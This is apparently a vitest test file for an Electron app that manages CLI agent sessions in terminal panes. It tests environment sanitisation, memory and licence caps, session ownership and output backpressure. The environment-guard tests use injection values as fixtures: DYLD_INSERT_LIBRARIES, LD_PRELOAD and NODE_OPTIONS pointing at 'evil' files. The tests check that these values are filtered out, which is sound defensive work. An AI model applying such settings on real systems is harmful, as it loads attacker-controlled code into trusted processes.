      baseUrl: 'https://token-plan.ap-southeast-1.maas.aliyuncs.com/compatible-mode/v1',
      models: ['qwen3.8-max'],
      tokenPlanKey: true,
      envKey: 'NEXUS_QWEN_KEY_0123456789abcdef0123456789abcdef',
    } as const;
    let sessionId: string | undefined;
    try {
      sessionId = spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        claudeLike(),
        { qwenSettingsInjection: injection },
        trustedSpawn(),
      ).sessionId;
      expect(hints).toEqual({ qwenSettingsInjection: injection });
    } finally {
      if (sessionId) await orchTerminateSession(sessionId);
      setAgentSpawnHook(null);
    }
  });
});

describe("agentEnv linker-injection guard (plugin trust boundary)", () => {
  it("drops DYLD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib", SAFE_VAR: "ok" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
    expect(env.SAFE_VAR).toBe("ok");
  });

  it("drops LD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { LD_PRELOAD: "/tmp/evil.so", LD_LIBRARY_PATH: "/tmp" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
  });

  it("drops DYLD_/LD_ keys from env.passthrough even if present in process.env", () => {
    process.env.DYLD_TEST_INJECT = "x";
    process.env.LD_TEST_INJECT = "y";
    try {
      const env = agentEnv(
        makeAdapter({
          static: {},
          passthrough: ["DYLD_TEST_INJECT", "LD_TEST_INJECT"],
          ephemeralHome: false,
        }),
      );
      expect(env.DYLD_TEST_INJECT).toBeUndefined();
      expect(env.LD_TEST_INJECT).toBeUndefined();
    } finally {
      delete process.env.DYLD_TEST_INJECT;
      delete process.env.LD_TEST_INJECT;
    }
  });

  it("keeps ordinary static and passthrough vars", () => {
    process.env.NEXUS_TEST_TOKEN = "secret";
    try {
      const env = agentEnv(
        makeAdapter({
          static: { FOO: "bar" },
          passthrough: ["NEXUS_TEST_TOKEN"],
          ephemeralHome: false,
        }),
      );
      expect(env.FOO).toBe("bar");
      expect(env.NEXUS_TEST_TOKEN).toBe("secret");
    } finally {
      delete process.env.NEXUS_TEST_TOKEN;
    }
  });
});

// No Windows o operador declara a variável no painel do Windows (ou com
// `setx`): ela vai para `HKCU\Environment` e o `process.env` do Main — congelado
// no boot — nunca a vê. Este é o caso relatado pelo cliente (MCP `mercadolivre`
// sem MARGEM_MCP_READ_URL/MARGEM_MCP_READ_TOKEN dentro do pane).
describe("agentEnv Windows user env (HKCU\\Environment)", () => {
  afterEach(() => setWindowsUserEnvDepsForTests(null));

  const REG_OUTPUT = [
    "HKEY_CURRENT_USER\\Environment",
    "    MARGEM_MCP_READ_URL    REG_SZ    https://margem.example/mcp",
    "    MARGEM_MCP_READ_TOKEN    REG_SZ    tok-123",
    "    NODE_OPTIONS    REG_SZ    --require /tmp/evil.js",
    "    NEXUS_MCP_TOKEN    REG_SZ    roubado",
    "",
  ].join("\r\n");

  it("entrega a variável do operador ao pane, sem reiniciar o app", () => {
    setWindowsUserEnvDepsForTests({
      platform: "win32",
      execFile: () => REG_OUTPUT,
    });
    const env = agentEnv(
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      null,
    );
    expect(env.MARGEM_MCP_READ_URL).toBe("https://margem.example/mcp");
    expect(env.MARGEM_MCP_READ_TOKEN).toBe("tok-123");
  });

  it("não dá ao registro do usuário a injeção de Node nem a autoridade NEXUS_", () => {
    setWindowsUserEnvDepsForTests({
      platform: "win32",
      execFile: () => REG_OUTPUT,
    });
    const env = agentEnv(
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      null,
    );
    expect(env.NODE_OPTIONS).toBeUndefined();
    expect(env.NEXUS_MCP_TOKEN).toBeUndefined();
  });

  it("fora do Windows não consulta o registro", () => {
    const execFile = vi.fn(() => REG_OUTPUT);
    setWindowsUserEnvDepsForTests({ platform: "darwin", execFile });
    const env = agentEnv(
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      null,
    );
    expect(env.MARGEM_MCP_READ_TOKEN).toBeUndefined();
    expect(execFile).not.toHaveBeenCalled();
  });
});

// A WebContents stub that always accepts sends (canSend passes).
function fakeWc(): WebContents {
  return {
    isDestroyed: () => false,
    isCrashed: () => false,
    send: () => {},
  } as unknown as WebContents;
}

// Records the per-session proxy so a test can see which control calls fired.
function fakeHost(): {
  host: PtyHost;
  procFor: (id: string) => PtyProcHandle;
  specFor: (id: string) => PtySpawnSpec;
} {
  const procs = new Map<string, PtyProcHandle>();
  const specs = new Map<string, PtySpawnSpec>();
  return {
    host: {
      spawn(spec, handlers) {
        let exited = false;
        const proc: PtyProcHandle = {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => {
            if (!exited) {
              exited = true;
              handlers.onExit(0, 15);
            }
            return {
              ok: true,
              rootExited: true,
              descendantsExited: true,
            };
          }),
        };
        specs.set(spec.sessionId, spec);
        procs.set(spec.sessionId, proc);
        return proc;
      },
    },
    procFor: (id) => procs.get(id)!,
    specFor: (id) => specs.get(id)!,
  };
}

describe('PTY footprint probe coalescing', () => {
  type Footprints = Awaited<ReturnType<typeof probePaneFootprints>>;
  function deferred() {
    let resolve!: (value: Footprints) => void;
    let reject!: (error: Error) => void;
    const promise = new Promise<Footprints>((yes, no) => { resolve = yes; reject = no; });
    return { promise, resolve, reject };
  }
  const sample = (sessionId: string) => [{ sessionId, rootPid: 123, processCount: 2, rssBytes: 1024 }];
  afterEach(() => { setPtyHost(fakeHost().host); });

  it('shares one physical probe between concurrent consumers and probes afresh afterward', async () => {
    const pending = deferred();
    const probe = vi.fn(() => pending.promise);
    const host = { ...fakeHost().host, probeFootprints: probe };
    setPtyHost(host);
    const first = probePaneFootprints();
    const second = probePaneFootprints();
    expect(second).toBe(first);
    await Promise.resolve();
    expect(probe).toHaveBeenCalledOnce();
    expect(probe.mock.contexts[0]).toBe(host);
    pending.resolve(sample('current'));
    expect(await first).toEqual(sample('current'));
    expect(await second).toEqual(sample('current'));
    await probePaneFootprints();
    expect(probe).toHaveBeenCalledTimes(2);
  });

  it.each(['reject', 'null'] as const)('%s releases the shared flight so the next consumer can retry', async (outcome) => {
    const pending = deferred();
    const probe = vi.fn().mockReturnValueOnce(pending.promise).mockResolvedValue(sample('retry'));
    setPtyHost({ ...fakeHost().host, probeFootprints: probe });
    const first = probePaneFootprints();
    const second = probePaneFootprints();
    if (outcome === 'reject') pending.reject(new Error('host unavailable'));
    else pending.resolve(null);
    expect(await first).toBeNull();
    expect(await second).toBeNull();
    expect(await probePaneFootprints()).toEqual(sample('retry'));
    expect(probe).toHaveBeenCalledTimes(2);
  });

  it('a replaced host never shares or publishes the old flight, whose completion cannot clear the new one', async () => {
    const old = deferred();
    const current = deferred();
    const oldProbe = vi.fn(() => old.promise);
    const currentProbe = vi.fn(() => current.promise);
    setPtyHost({ ...fakeHost().host, probeFootprints: oldProbe });
    const oldRead = probePaneFootprints();
    await Promise.resolve();
    setPtyHost({ ...fakeHost().host, probeFootprints: currentProbe });
    const currentRead = probePaneFootprints();
    const thirdRead = probePaneFootprints();
    await Promise.resolve();
    // Resolve both in finally so RED never leaves an unhandled fixture flight.
    try {
      expect(currentRead).not.toBe(oldRead);
      expect(thirdRead).toBe(currentRead);
      expect(oldProbe).toHaveBeenCalledOnce();
      expect(currentProbe).toHaveBeenCalledOnce();
      old.resolve(sample('stale'));
      expect(await oldRead).toBeNull();
      expect(probePaneFootprints()).toBe(currentRead);
      current.resolve(sample('fresh'));
      expect(await currentRead).toEqual(sample('fresh'));
      expect(currentProbe).toHaveBeenCalledOnce();
    } finally { old.resolve(null); current.resolve(null); await Promise.all([oldRead, currentRead, thirdRead]); }
  });

  it('switching to a host without probes cannot expose the previous host sample', async () => {
    const old = deferred();
    setPtyHost({ ...fakeHost().host, probeFootprints: () => old.promise });
    const oldRead = probePaneFootprints();
    setPtyHost(fakeHost().host);
    const currentRead = probePaneFootprints();
    old.resolve(sample('stale'));
    expect(await oldRead).toBeNull();
    expect(await currentRead).toBeNull();
  });
});

describe('automatic worker resource admission at physical spawn', () => {
  afterEach(() => {
    vi.unstubAllEnvs();
    primeSystemMemoryCacheForTest(null);
  });

  it('counts ACP, pending PTY children and physical termination, then resumes in the same scope', async () => {
    vi.stubEnv('NEXUS_PANE_GUARD', '');
    vi.stubEnv('NEXUS_PANE_CAP', '2');
    primeSystemMemoryCacheForTest({ freeMB: 64_000, swapUsedMB: 0 });
    const h = fakeHost(); setPtyHost(h.host);
    const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
    const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
    const authority = legacyManualWorker();
    const user = spawnAgentSession(fakeWc(), req, adapter, {}, trustedSpawn());
    const acp = AcpClient.spawn({ command: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)'] });
    const children = [user.sessionId];
    try {
      expect(() => spawnAgentSession(null, req, adapter, {}, authority)).toThrow(/Teto/);
      await acp.shutdown();
      const worker = spawnAgentSession(null, req, adapter, {}, authority);
      children.push(worker.sessionId);
      expect(getSessionState(worker.sessionId)).toBe('spawning');
      expect(() => spawnAgentSession(null, req, adapter, {}, authority)).toThrow(/Teto/);
      let prove!: () => void;
      const proof = new Promise<void>(resolve => { prove = resolve; });
      vi.mocked(h.procFor(worker.sessionId).terminate).mockImplementationOnce(async () => {
        await proof; return { ok: true, rootExited: true, descendantsExited: true };
      });
      const stopping = orchTerminateSession(worker.sessionId);
      try {
        expect(() => spawnAgentSession(null, req, adapter, {}, authority)).toThrow(/Teto/);
      } finally { prove(); await stopping; }
      const resumed = spawnAgentSession(null, req, adapter, {}, authority);
      children.push(resumed.sessionId);
      expect(getAgentSessionInfo(resumed.sessionId)).toMatchObject({ scope: authority.scope, missionId: authority.context!.missionId });
    } finally {
      for (const id of children) await orchTerminateSession(id);
      await acp.shutdown();
    }
  });

  it('F-1006: writer em worktree própria guarda o escopo de coordenação (stores) além do de execução', async () => {
    vi.stubEnv('NEXUS_PANE_GUARD', '');
    vi.stubEnv('NEXUS_PANE_CAP', '4');
    primeSystemMemoryCacheForTest({ freeMB: 64_000, swapUsedMB: 0 });
    const h = fakeHost(); setPtyHost(h.host);
    const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
    const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
    const authority = legacyManualWorker();
    const children: string[] = [];
    try {
      const worker = spawnAgentSession(null, req, adapter, {}, authority);
      children.push(worker.sessionId);
      const user = spawnAgentSession(fakeWc(), req, adapter, {}, trustedSpawn());
      children.push(user.sessionId);
      expect(authority.coordinationScope!.rootRealPath).not.toBe(authority.scope.rootRealPath);
      expect(getAgentSessionInfo(worker.sessionId)).toMatchObject({
        scope: authority.scope,
        coordinationScope: authority.coordinationScope,
      });
      // Mesmo checkout na execução e na coordenação: nada a acrescentar.
      expect(getAgentSessionInfo(user.sessionId)?.coordinationScope).toBeUndefined();
    } finally {
      for (const id of children) await orchTerminateSession(id);
    }
  });

  it.each([16, 32])('requires room for one child on %i GB but preserves explicit human choices', async (gb) => {
    const totalmem = vi.spyOn(os, 'totalmem').mockReturnValue(gb * 1024 ** 3);
    vi.stubEnv('NEXUS_PANE_GUARD', '');
    const limits = limitsForMachine(gb * 1024);
    primeSystemMemoryCacheForTest({ freeMB: limits.minFreeMB + AGENT_PANE_FOOTPRINT_MB - 1, swapUsedMB: 0 });
    const h = fakeHost(); setPtyHost(h.host);
    const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
    const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
    const worker = legacyManualWorker();
    const children: string[] = [];
    try {
      expect(() => spawnAgentSession(null, req, adapter, {}, worker)).toThrow(/Memória/);
      const hand = { ...worker, context: { ...worker.context!, operatorOpened: true as const } };
      children.push(spawnAgentSession(fakeWc(), req, adapter, {}, hand).sessionId);
      children.push(spawnAgentSession(fakeWc(), req, adapter, {}, trustedSpawn()).sessionId);
      vi.stubEnv('NEXUS_PANE_GUARD', 'off');
      children.push(spawnAgentSession(null, req, adapter, {}, worker).sessionId);
    } finally {
      for (const id of children) await orchTerminateSession(id);
      totalmem.mockRestore();
    }
  });

  it.each([16, 32])('reserves the cached memory headroom across a %i GB burst and pending startup', async (gb) => {
    const totalmem = vi.spyOn(os, 'totalmem').mockReturnValue(gb * 1024 ** 3);
    vi.stubEnv('NEXUS_PANE_GUARD', '');
    const limits = limitsForMachine(gb * 1024);
    const sample = { freeMB: limits.minFreeMB + 1.5 * AGENT_PANE_FOOTPRINT_MB, swapUsedMB: 0 };
    primeSystemMemoryCacheForTest(sample);
    const h = fakeHost(); setPtyHost(h.host);
    const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
    const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
    const authority = legacyManualWorker();
    const children: string[] = [];
    try {
      const first = spawnAgentSession(null, req, adapter, {}, authority);
      children.push(first.sessionId);
      expect(() => spawnAgentSession(null, req, adapter, {}, authority)).toThrow(/Memória/);
      // A fresh sample still cannot include a child waiting on async readiness.
      primeSystemMemoryCacheForTest({ ...sample });
      expect(() => spawnAgentSession(null, req, adapter, {}, authority)).toThrow(/Memória/);
      await orchTerminateSession(first.sessionId);
      const resumed = spawnAgentSession(null, req, adapter, {}, authority);
      children.push(resumed.sessionId);
      publishSessionActivityState(resumed.sessionId, 'idle');
      // Finishing startup alone does not re-use the old sample. Only a new
      // measurement taken after startup can absorb that reservation.
      expect(() => spawnAgentSession(null, req, adapter, {}, authority)).toThrow(/Memória/);
      primeSystemMemoryCacheForTest({ ...sample });
      children.push(spawnAgentSession(null, req, adapter, {}, authority).sessionId);
    } finally {
      for (const id of children) await orchTerminateSession(id);
      totalmem.mockRestore();
    }
  });
});

it('enforces a shared two-agent cap across PTY and ACP and releases only on physical finalization', async () => {
  // Run before legacy ownership fixtures accumulate their fake live sessions.
  expect(licensedAgentCount()).toBe(0);
  vi.mocked(maxAgents).mockReturnValue(2);
  const h = fakeHost(); setPtyHost(h.host);
  const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
  const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
  const a = spawnAgentSession(fakeWc(), req, adapter, {}, trustedSpawn());
  const b = AcpClient.spawn({ command: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)'] });
  try {
    expect(licensedAgentCount()).toBe(2);
    expect(() => spawnAgentSession(fakeWc(), req, adapter, {}, trustedSpawn())).toThrow(/license_agent_limit/);
    expect(() => AcpClient.spawn({ command: process.execPath, args: ['-e', ''] })).toThrow(/license_agent_limit/);
    let prove!: () => void;
    const proof = new Promise<void>(resolve => { prove = resolve; });
    vi.mocked(h.procFor(a.sessionId).terminate).mockImplementationOnce(async () => {
      await proof; return { ok: true, rootExited: true, descendantsExited: true };
    });
    const stopping = orchTerminateSession(a.sessionId);
    expect(licensedAgentCount()).toBe(2);
    prove(); await stopping;
    expect(licensedAgentCount()).toBe(1);
    const c = spawnAgentSession(fakeWc(), req, adapter, {}, trustedSpawn());
    expect(licensedAgentCount()).toBe(2);
    await orchTerminateSession(c.sessionId);
  } finally { await orchTerminateSession(a.sessionId); await b.shutdown(); }
  expect(licensedAgentCount()).toBe(0);
});

it('A1: a denied license cannot adopt a matching live warm child', async () => {
  const h = fakeHost(); setPtyHost(h.host);
  const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
  const authority = trustedSpawn();
  const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
  const child = spawnAgentSession(null, req, adapter, {}, authority);
  warmPool.setWarmPoolSize(1);
  warmPool.put({ ...child, startKey: child.startKey!, cli: adapter.id, bornAtMs: Date.now(), cwd: authority.cwd, scopeRootRealPath: authority.scope.rootRealPath });
  vi.mocked(requireAccess).mockReturnValue({ ok: false, reason: 'suspended' });
  try {
    expect(() => spawnAgentSession(fakeWc(), req, adapter, {}, authority)).toThrow(/license_access_denied/);
    expect(() => tryAdoptWarmSession(adapter.id, authority, authority.cwd)).toThrow(/license_access_denied/);
  } finally { warmPool.resetForTesting(); await orchTerminateSession(child.sessionId); }
});

it('A1: denial after taking a warm child terminates its lease instead of losing it outside the pool', async () => {
  const h = fakeHost(); setPtyHost(h.host);
  const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
  const authority = trustedSpawn();
  const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
  const child = spawnAgentSession(null, req, adapter, {}, authority);
  warmPool.setWarmPoolSize(1);
  warmPool.put({ ...child, startKey: child.startKey!, cli: adapter.id, bornAtMs: Date.now(), cwd: authority.cwd, scopeRootRealPath: authority.scope.rootRealPath });
  vi.mocked(requireAccess).mockReturnValueOnce({ ok: true }).mockReturnValue({ ok: false, reason: 'license-expired' });
  try {
    expect(() => spawnAgentSession(fakeWc(), req, adapter, {}, authority)).toThrow(/license_access_denied/);
    expect(h.procFor(child.sessionId).terminate).toHaveBeenCalledOnce();
    await vi.waitFor(() => expect(licensedAgentCount()).toBe(0));
  } finally { warmPool.resetForTesting(); await orchTerminateSession(child.sessionId); }
});

it('A1: warm children reserve both trial slots and adoption reuses a reservation', async () => {
  vi.mocked(maxAgents).mockReturnValue(2);
  const h = fakeHost(); setPtyHost(h.host);
  const adapter = makeAdapter({ static: {}, passthrough: [], ephemeralHome: false });
  const authority = trustedSpawn();
  const req = { kind: 'cli-agent' as const, cols: 80, rows: 24 };
  const a = spawnAgentSession(null, req, adapter, {}, authority);
  const b = spawnAgentSession(null, req, adapter, {}, authority);
  warmPool.setWarmPoolSize(2);
  for (const child of [a, b]) warmPool.put({ ...child, startKey: child.startKey!, cli: adapter.id, bornAtMs: Date.now(), cwd: authority.cwd, scopeRootRealPath: authority.scope.rootRealPath });
  try {
    expect(licensedAgentCount()).toBe(2);
    expect(() => spawnAgentSession(fakeWc(), { ...req, paneId: 'cold' }, adapter, {}, authority)).toThrow(/license_agent_limit/);
    expect(spawnAgentSession(fakeWc(), req, adapter, {}, authority)).toEqual(a);
    expect(licensedAgentCount()).toBe(2);
    expect(getSessionState(b.sessionId)).not.toBe('exited');
  } finally { warmPool.resetForTesting(); await orchTerminateSession(a.sessionId); await orchTerminateSession(b.sessionId); }
  expect(licensedAgentCount()).toBe(0);
});

describe("PTY session ownership (renderer capability boundary)", () => {
  it("readoção zera a janela de ACK: as mensagens em voo do renderer anterior não seguram o push do novo", async () => {
    const real = fakeHost();
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(spec, next) {
        handlers = next;
        return real.host.spawn(spec, next);
      },
    });
    const authority = legacyManualWorker();
    const { sessionId } = spawnMainOwnedAgentSession(
      { kind: "cli-agent", cols: 120, rows: 36, paneId: "pane-window-reset", adapterId: "test-cli" },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    const claim = {
      paneId: "pane-window-reset",
      adapterId: "test-cli",
      missionId: "mission-worker",
      role: "worker" as const,
      workerIncarnationId: "worker-incarnation-main-owned",
      model: undefined,
      accountId: undefined,
      effort: undefined,
      cwd: authority.cwd,
      agentName: undefined,
      readOnly: false,
      nativeReadOnly: true,
      allowedTools: [] as string[],
      allowedSkills: null,
      authoritySeal: undefined,
      scope: authority.scope,
    };
    const makeOwner = () => {
      const send = vi.fn();
      return { send, wc: { isDestroyed: () => false, isCrashed: () => false, send } as unknown as WebContents };
    };
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const first = makeOwner();
      expect(adoptMainOwnedAgentSession(first.wc, claim)).not.toBeNull();
      const h = handlers as PtySessionHandlers | null;
      const big = "x".repeat(40 * 1024);
      h?.onData(big); // em voo
      h?.onData(big); // em voo: 80 KiB, janela de caracteres cheia
      h?.onData(big); // retido atrás da janela
      const dataSends = (send: ReturnType<typeof vi.fn>) =>
        send.mock.calls.filter(([channel]) => channel === PTY_CHANNELS.data);
      expect(dataSends(first.send)).toHaveLength(2);

      // A janela fecha: o renderer sai (reload) sem confirmar nada.
      killSessionsFor(first.wc);
      const second = makeOwner();
      expect(adoptMainOwnedAgentSession(second.wc, claim)).not.toBeNull();
      h?.onData(big);
      // As 2 mensagens do renderer anterior não existem mais para o novo: o retido sai já.
      const sent = dataSends(second.send).map(([, event]) => event as { sequence: number });
      expect(sent.map((event) => event.sequence)).toEqual([3, 4]);
    } finally {
      warn.mockRestore();
      await orchTerminateSession(sessionId);
    }
  });

  it("keeps a detached mission agent in the app-shutdown physical inventory", async () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const authority = legacyManualWorker();
    const { sessionId } = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 120,
        rows: 36,
        paneId: "pane-main-owned",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    const proc = h.procFor(sessionId);
    const owner = fakeWc();
    expect(liveSessionSummary()).toEqual({ total: 1, busy: 1 });
    expect(liveSessionSummary(owner)).toEqual({ total: 0, busy: 0 });
    const exactClaim = {
      paneId: "pane-main-owned",
      adapterId: "test-cli",
      missionId: "mission-worker",
      role: "worker" as const,
      workerIncarnationId: "worker-incarnation-main-owned",
      model: undefined,
      accountId: undefined,
      effort: undefined,
      cwd: authority.cwd,
      agentName: undefined,
      readOnly: false,
      nativeReadOnly: true,
      allowedTools: [] as string[],
      allowedSkills: null,
      authoritySeal: undefined,
      scope: authority.scope,
    };

    expect(isSessionDetached('unknown-session')).toBe(false);
    expect(isSessionDetached(sessionId)).toBe(true);
    const slotsBeforeAdoption = licensedAgentCount();
    expect(adoptMainOwnedAgentSession(owner, exactClaim)).toEqual({
      sessionId,
      state: "spawning",
    });
    expect(licensedAgentCount()).toBe(slotsBeforeAdoption);
    expect(isSessionDetached(sessionId)).toBe(false);
    expect(writeSession(owner, sessionId, "continue\r")).toBe(false);
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      workerIncarnationId: "worker-incarnation-main-owned",
    });
    expect(proc.write).not.toHaveBeenCalled();
    killSession(owner, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(orchWriteSession(sessionId, "main-before-detach\r")).toBe(true);
    expect(proc.write).toHaveBeenCalledWith("main-before-detach\r");

    // Closing/crashing a renderer must detach an orchestrated mission process,
    // not kill the worker that the main coordinator still owns.
    killSessionsFor(owner);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(writeSession(owner, sessionId, "forged\r")).toBe(false);
    expect(orchWriteSession(sessionId, "main\r")).toBe(true);
    expect(isSessionDetached(sessionId)).toBe(true);
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);

    const replacement = fakeWc();
    expect(
      adoptMainOwnedAgentSession(replacement, {
        ...exactClaim,
        readOnly: true,
      }),
    ).toBeNull();
    // F-924: pin de conta divergente não adota; modelo/esforço/conta sem
    // pin são do processo vivo e não impedem a adoção.
    expect(
      adoptMainOwnedAgentSession(replacement, {
        ...exactClaim,
        accountId: "acct-other",
      }),
    ).toBeNull();
    expect(adoptMainOwnedAgentSession(replacement, {
      ...exactClaim,
      model: "upgraded-model",
      effort: "high",
    })).toEqual({
      sessionId,
      state: "busy",
    });
    expect(isSessionDetached(sessionId)).toBe(false);
    killSession(replacement, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    killSessionsFor(replacement);
    expect(isSessionDetached(sessionId)).toBe(true);
    const shutdown = terminateAllSessions();
    expect(isSessionDetached(sessionId)).toBe(false);
    await expect(shutdown).resolves.toEqual({
      ok: true,
      attemptedSessionIds: [sessionId],
      terminatedSessionIds: [sessionId],
      failedSessionIds: [],
    });
    expect(proc.terminate).toHaveBeenCalledOnce();
    expect(isSessionDetached(sessionId)).toBe(false);
    __resetPtyShutdownLifecycleForTests();
  });

  it("reattaches an owned mission session to the same renderer after a page reload", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const authority = legacyManualWorker();
    const { sessionId } = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 120,
        rows: 36,
        paneId: "pane-reattach",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    const owner = fakeWc();
    const claim = {
      paneId: "pane-reattach",
      adapterId: "test-cli",
      missionId: "mission-worker",
      role: "worker" as const,
      workerIncarnationId: "worker-incarnation-main-owned",
      model: undefined,
      accountId: undefined,
      effort: undefined,
      cwd: authority.cwd,
      agentName: undefined,
      readOnly: false,
      nativeReadOnly: true,
      allowedTools: [] as string[],
      allowedSkills: null,
      authoritySeal: undefined,
      scope: authority.scope,
    };
    expect(adoptMainOwnedAgentSession(owner, claim)).toEqual({
      sessionId,
      state: "spawning",
    });

    // A page reload keeps the same WebContents but wipes the renderer's
    // session map; re-adoption by the SAME owner must reattach, not null out
    // into the physical-exit fence.
    expect(adoptMainOwnedAgentSession(owner, claim)).toEqual({
      sessionId,
      state: "spawning",
    });

    // A different renderer still cannot take a session owned by another wc.
    expect(adoptMainOwnedAgentSession(fakeWc(), claim)).toBeNull();
  });

  it("sequences output and recovers missed push chunks through the owner-only pull lane", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const attacker = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    (handlers as PtySessionHandlers | null)?.onData("one");
    (handlers as PtySessionHandlers | null)?.onData("two");
    expect(send).toHaveBeenNthCalledWith(1, "pty:data", {
      sessionId,
      data: "one",
      sequence: 1,
    });
    expect(recoverSessionOutput(owner, sessionId, 0)).toHaveLength(2);
    acknowledgeSessionOutput(owner, sessionId, 1);
    expect(recoverSessionOutput(owner, sessionId, 1)).toEqual([
      { sessionId, data: "two", sequence: 2 },
    ]);
    expect(recoverSessionOutput(attacker, sessionId, 0)).toEqual([]);
    orchKillSession(sessionId);
  });

  it("pauses output push over the backpressure budget and resumes after acks", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const h = handlers as PtySessionHandlers | null;
      const big = "x".repeat(200 * 1024);
      const dataSends = () =>
        send.mock.calls.filter(([channel]) => channel === PTY_CHANNELS.data);

      // A janela T3 (8 chunks / 64 KiB) já fecha com um único chunk de 200K.
      h?.onData(big); // seq 1 — janela vazia: enviado
      h?.onData(big); // seq 2 — janela cheia: push pausado
      h?.onData(big); // seq 3 — pausado
      h?.onData(big); // seq 4 — pausado (e acima do teto de 512K não-ackeados)
      expect(dataSends().map(([, e]) => e.sequence)).toEqual([1]);

      // Paused chunks still land in the replay window and stay pullable.
      expect(
        recoverSessionOutput(owner, sessionId, 1).map((e) => e.sequence),
      ).toEqual([2, 3, 4]);

      // One throttled warning despite repeated trips.
      expect(
        warn.mock.calls.filter(([message]) =>
          String(message).includes("backpressure"),
        ),
      ).toHaveLength(1);

      // O recover acima ENTREGOU 2..4 ao renderer: não são empurrados de novo
      // (uma faixa que cruzasse o high-water dele seria descartada inteira).
      acknowledgeSessionOutput(owner, sessionId, 1);
      expect(dataSends().map(([, e]) => e.sequence)).toEqual([1]);
      acknowledgeSessionOutput(owner, sessionId, 4);
      h?.onData("tail");
      expect(dataSends().at(-1)?.[1]).toEqual({
        sessionId,
        data: "tail",
        sequence: 5,
      });
      expect(dataSends()).toHaveLength(2);
    } finally {
      warn.mockRestore();
      orchKillSession(sessionId);
    }
  });

  /** Sequências cobertas por um evento de push (faixa coalescida: firstSequence..sequence). */
  const coveredSequences = (event: { sequence: number; firstSequence?: number }): number[] =>
    Array.from(
      { length: event.sequence - (event.firstSequence ?? event.sequence) + 1 },
      (_, i) => (event.firstSequence ?? event.sequence) + i,
    );

  it("rajada de 20 chunks: o ack do que chegou empurra o resto coalescido e em ordem, sem saída nova nem pull", () => {
    let handlers: PtySessionHandlers | null = null;
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => ({ ok: false, rootExited: false, descendantsExited: false })),
        };
      },
    });
    const send = vi.fn();
    const owner = { isDestroyed: () => false, isCrashed: () => false, send } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
